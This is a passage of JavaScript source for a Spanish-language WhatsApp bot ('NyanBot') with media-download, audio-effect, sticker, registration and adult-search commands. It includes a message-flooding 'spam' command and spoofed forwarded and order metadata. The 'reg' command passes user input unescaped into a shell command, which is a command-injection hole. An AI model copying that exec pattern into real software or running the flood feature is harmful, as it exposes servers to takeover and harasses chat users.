ini_txt += `Puede descargar tambien el video aqui: :\n ${get_result.video[0].link}\n`
ini_buffer = await getBuffer(get_info.thumbnail)
await samu330.sendMessage(from, ini_buffer, image, { quoted: ftoko, caption: ini_txt, thumbnail: fakee, contextInfo: {"forwardingScore": 9999, "isForwarded": true} })
get_audio = await getBuffer(get_result.audio[4].link)
await samu330.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', duration :-999999999999999, filename: `${get_info.title}.mp3`, quoted: faud })
get_audio = await getBuffer(get_result.audio[4].link)
await samu330.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', duration :-999999999999999, ptt: true, filename: `${get_info.title}.mp3`, quoted: faud })

} catch {

reply('Ocurrio un problema con el servidor *1*, Porfavor espera mientras pruebo en el servidor *2*')
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res = await yts(q).catch(e => {
reply('_[ ! ] Lo siento, su busqueda no pudo ser completada_')
})
let thumbInfo = ` [ *${res.all[0].title}* ]
*°Subido hace* ${res.all[0].ago}
*°Vistas :* ${res.all[0].views}
*°Duracion :* ${res.all[0].timestamp}
*°Canal :* ${res.all[0].author.name}
*°Link del Canal :* ${res.all[0].author.url}

*_El archivo se esta enviando....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: sam, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error del servidor_')
})
sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', duration: 99999999999999, filename: res[0].output})
sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res[0].output})
}}
break
			
case 'tik':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Y el link de TikTok¿`)
tik = await getJson(`https://fxc7-api.herokuapp.com/api/download/tiktok?apikey=Fxc7&url=${q}`)
tok = `[ *🐱‍👤Samu330* ]
_Video enviandose..._

*Video sin marca de agua:*
_${tik.result.nowatermark}_

*Video con marca de agua:*
_${tik.result.watermark}_

*Audio:*
_${tik.result.audio}_`
videot = getBuffer(`${tik.result.nowatermark}`)
samu330.sendMessage(from, videot, video, {quoted: fvid, caption: tok, mimetype: Mimetype.gif, duration: 9999999999})
break
			
case 'spam':
if (!itsMe) return reply('Este comando es solo para 🐉Samu330🪀')
arg1 = q
if (!arg1) return reply(`Ejemplo ${prefix}spam texto|numero de mensajes`)
argz = arg1.split("|")
if (!argz) return reply(`Porfavor usa el simbolo "|" para dividir entre el mensaje y el numero de veses a enviar el mensaje`)
if (isNaN(argz[1])) return reply(`Y el numero de veses a enviar?`)
members = []
for (let i = 0; i < argz[1]; i++){
samu330.sendMessage(from, argz[0], MessageType.text, {quoted: { key : {fromMe: false, participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624053141@g.us" } : {})},message: {orderMessage: {itemCount : 9999999999999999,status: 1,surface : 1,message: `🥀S͓̽α͓̽м͓̽υ͓̽3͓̽3͓̽0͓̽🍒 | 🐉𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹`,orderTitle: '',sellerJid: `Sam330`,thumbnail: fs.readFileSync('./src/fake.jpg')}},
contextInfo: { mentionedJid: members }}})
}
break
case 'ytmp3':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
reply('*Espere un momento...*')
res = await y2mateA(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}kbps
*°Nombre del archivo :* ${res[0].output}
*°Salida :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam}).then((lalu) => {
sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', duration: 99999999})
sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999})
})

break
case 'ytmp4':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
reply(mess.wait)
res = await y2mateV(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}p
*°Nombre :* ${res[0].output}
*°Output :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam}).then((lalu) => {
sendFileFromUrl(res[0].link, video, {quoted: fvid, mimetype: Mimetype.gif, duration: 9999999999})
})
break

case 'tomp3':
case 'toaudio':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
samu330.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Y el video?')
reply('*Perame tatito!*')
const encmedia3 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const media3 = await samu330.downloadAndSaveMediaMessage(encmedia3)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media3} ${ran}`, (err) => {
fs.unlinkSync(media3)
if (err) return reply(mess.ferr)
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: faud})
fs.unlinkSync(ran)
})
break

case 'imut':
encmedia = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await samu330.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})

break
case 'hode':
encmedia = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await samu330.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})

break

case 'trigger':
reply(mess.wait)
tri = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ger = await samu330.downloadAndSaveMediaMessage(tri)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${ger} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(ger)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})

break

case 'slow':
reply(mess.wait)
low = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await samu330.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})

break
case 'ardilla':
reply(mess.wait)
pai = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo

tup = await samu330.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})

break
case 'grave':
reply(mess.wait)
muk = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await samu330.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})

break
case 'bass':
ass = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo

bas = await samu330.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})

break
case 'wa.me':
case 'wame':
samu330.updatePresence(from, Presence.composing)
options = {
text: `Link de WhatsApp: *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O tambien puedes usar:*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, options, MessageType.text, {
quoted: ftoko
})
break

case 'bug':
if (!isRegister) return reply(mess.only.usrReg)
const pesan = args.join(' ')
if (pesan.length > 300) return samu330.sendMessage(from, 'Lo siento texto demasiado largo, máximo 300 caracteres', msgType.text, {quoted: sam})
var nomor = sam.participant
const teks1 = `*[REPORT]*\nNumero : @${nomor.split("@s.whatsapp.net")[0]}\nProblema : ${pesan}`

var options = {
text: teks1,
contextInfo: {mentionedJid: [nomor]},
}
samu330.sendMessage('5219984907794@s.whatsapp.net', options, text, {quoted: sam})
reply('El problema ha sido informado al propietario del BOT, informe falso o broma, sera ban definitivo.')
break
			
case 'reg':
if (isRegister) return reply('*Tu cuenta ya estaba verificada*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO DE REGISTRO:* ${prefix}reg *Samu|17*`)
const nombre = q.substring(0, q.indexOf('|') - 0)
const edad = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
const momento = require('moment-timezone')
const time = momento.tz('America/Mexico_City').format('HH:mm:ss')
if(isNaN(edad)) return await reply('*La edad es un numero🙄*!!')
if (nombre.length >= 10) return reply(`*Tu nombre es acaso un tren?*\nUn nombre no puede tener mas de *10* letras`)
if (edad > 30) return reply(`Uuuu, yastas viejito:c\n*Lo siento pero no puedo registrarte si eres mayor de 30 años*`)
if (edad < 13) return reply(`Eres menor de 13 años, no puedo hacer un registro tuyo lo siento.\n*Si quieres muestrame una autorizacion de tus padres diciendo que puedes pasar tiempo usando este bot para que pueda aceptarte:d*`)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
veri = sender                                                
addRegisteredUser(sender, nombre, edad, time, serialUser)
exec(`magick './src/reg.jpg' -gravity west -fill '#00FF00' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${nombre}' -pointsize 35 -annotate +460+200 '${serialUser}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'regsm.jpg'`)
.on('error', () => reply('error'))
.on('exit', () => {
samu330.sendMessage(from, 'regsm.jpg', image, { quoted: sam, caption: `*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`})
})
break

case 'owner':
case 'creador':
await wa.sendContact(from, owner, "🥇𝑺𝒂𝒎𝒖𝟑𝟑𝟎🛺💨")
break
	
case 'tiktok':
url = args.join(" ")
result = await ssstik(url)
console.log(result)
buf = await getBuffer(`${result.videonowm}`)
samu330.sendMessage(from, buf, MessageType.video, {mimetype: 'video/mp4', filename: `tiktok.mp4`, quoted: sam, caption: `${result.text}\n\nUrl music : ${result.music}`})
break
			
case 'smeme':
gh = body.slice(7).replace(/ /g, '%20')
wo1 = gh.split("|")[0];
wo2 = gh.split("|")[1];
if ((isMedia && !sam.message.videoMessage || isQuotedImage)) {
jars = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
wors = await samu330.downloadAndSaveMediaMessage(jars)
datae = await imageToBase64(JSON.stringify(wors).replace(/\"/gi, ''))
fs.writeFileSync('smeme.jpeg', datae, 'base64')
anu = await uploadImages('smeme.jpeg')
baleg = await getBuffer(`https://api.memegen.link/images/custom/${wo1}/${wo2}.png?background=${anu}`)
samu330.sendMessage(from, baleg, MessageType.image, {quoted: sam})
}
break
case 'noprefix':
prefix = ''
reply(`*EL PREFIJO YA NO ES NECESARIO AHORA!*`)
break
			
case 'shortlink':
url = args.join(" ")
request(`https://tinyurl.com/api-create.php?url=${url}`, function (error, response, body) {
try {
reply(body)
} catch (e) {
reply(e)
}
})
break
        
case 'exif':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (args.length < 1) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
if (!arg.split('|')) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
exif.create(arg.split('|')[0], arg.split('|')[1])
reply(`*El nombre de paquete de Stiker a cambiado a:* _${arg.split('|')[0]}\n*Y el autor a:* ${arg.split('|')[1]}`)
break
			
case 'takestick':
if (!isQuotedSticker) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
const stsam = body.slice(11)
if (!stsam.includes('|')) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
const encmedia = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname = stsam.split('|')[0]
const author = stsam.split('|')[1]
exif.create(packname, author, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), floc)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
break
			
case 'scdl':
var url = budy.slice(6)
var res1 = await axios.get(`https://lindow-api.herokuapp.com/api/dlsoundcloud?url=${url}&apikey=${apikey}`)
var { title, result } = res1.data
thumbb = await getBuffer(`${res1.data.image}`)
samu330.sendMessage(from, thumbb, MessageType.image, {caption: `${title}`})
audiony = await getBuffer(result)
samu330.sendMessage(from, audiony, MessageType.audio, {mimetype: 'audio/mp4', filename: `${title}.mp3`, quoted: sam})
break
			
case 'par':
pares = await axios.get(`https://lindow-api.herokuapp.com/api/ppcouple?apikey=${apikey}`)
var { male, female } = pares.data.result
picmale = await getBuffer(`${male}`)
samu330.sendMessage(from, picmale, image, {quoted: fimg})
picfemale = await getBuffer(`${female}`)
samu330.sendMessage(from, picfemale, image, {quoted: fimg})
break
			
case 'animevid':
url = `https://lindow-api.herokuapp.com/api/randomaesthetic?apikey=${apikey}`
estetik = await getBuffer(url)
samu330.sendMessage(from, estetik, MessageType.video, {mimetype: 'video/mp4', duration : 999999999, filename: `estetod.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break
			
case 'asupan':
url = `https://lindow-api.herokuapp.com/api/asupan?apikey=${apikey}`
asupan = await getBuffer(url)
samu330.sendMessage(from, asupan, MessageType.video, {mimetype: 'video/mp4', duration : 999999999,filename: `asupan.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break

case 'robar':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (!isQuotedSticker) return reply(`*Tururuu.... y el stiker kbron?*`)
const encmediia = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const meidia = await samu330.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(meidia)
})
break
			
case 'swm':
case 'stickerwm':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
if (!arg.includes('|')) return reply(`Envie o etiquete una imagen con el comando: *${prefix}swn nombre|autor*`)
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), fliveLoc)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
if (!arg.includes('|')) return reply(`Envie o etiquete un video/gif con el comando: *${prefix}swm nombre|autor*`)
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
reply('wait')
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
}
break
			
case 'pornode':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${api}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Vistas   : ${x.views}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.uploader}\n`
ini_txt += `Link     : ${x.link}\n`
ini_txt += `Imagen   : ${x.thumbnail}\n`
}
reply(ini_txt)

break

case 'xvid':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://fxc7-api.herokuapp.com/api/search/xvideos?apikey=Fxc7&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.channel.name}\n`
ini_txt += `Link     : ${x.url}\n\n╼━━━━━━━━━━━━━━━━━━━━━━━━━━╾\n`
}
reply(ini_txt)

break

case 'lucky':
a = '🍇'
b = '🍎'
c = '🍓'
e = '🍑'
f = '💰'
g = '🥝'
pw = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck = pw[Math.floor(Math.random() * pw.length)]
pw1 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck1 = pw1[Math.floor(Math.random() * pw1.length)]
pw2 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck2 = pw2[Math.floor(Math.random() * pw2.length)]
pw3 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck3 = pw3[Math.floor(Math.random() * pw3.length)]
pw4 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck4 = pw4[Math.floor(Math.random() * pw4.length)]
pw5 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck5 = pw5[Math.floor(Math.random() * pw5.length)]
pw6 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck6 = pw6[Math.floor(Math.random() * pw6.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
s = `┃ │  ${luck} │  ${luck1} │ ${luck2}`
a = `┃ │  ${luck3} │  ${luck4} │ ${luck5}`
m = `┃ │  ${luck6} │  ${luck7} │ ${luck7}`
u = `┌ ﹍﹍𝈺﹉﹉﹉𝈻﹍﹍ ┐ 
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
${s}
┃ ├──────────┤ ┃
${a}
┃ ├──────────┤ ┃
${m}
╿ └──────────┘ ╿
╰─┨⃞🔮𝉃𝜄𝜐𝉃𝜍𝜅𝉃𝛾🔮⃞ ┠─╯`
reply(`${u}`)
break
	
case 'sticker':
case 's':
case 'stiker':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
const encmedia1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media1 = await samu330.downloadAndSaveMediaMessage(encmedia1, `./sticker/${sender}`)
const packname10 = `\n\n\n\n\n\n\n\n\n\n\nSamu330 NyanBot\n\n       Sam y Perry`
const author10 = args.join(' ')
exif.create(packname10, author10, `stickwm_${sender}`)
await ffmpeg(`${media1}`)
.input(media1)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media1)
reply('*Intenta de nuevo*')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media1)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,
fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]
paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
const encmedia2 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.
contextInfo : sam
const media2 = await samu330.downloadAndSaveMediaMessage(encmedia2, `./sticker/${sender}`)
const packname101 = `\n\n\n\n\n\n\n\n\n\n\nSamu330 NyanBot\n\n       Sam y Perry`
const author101 = args.join(' ')
exif.create(packname101, author101, `stickwm_${sender}`)
reply('*⌛EN PROCESO*')
await ffmpeg(`${media2}`)
.inputFormat(media2.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media2)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('*Intenta de nuevo*')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media2)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
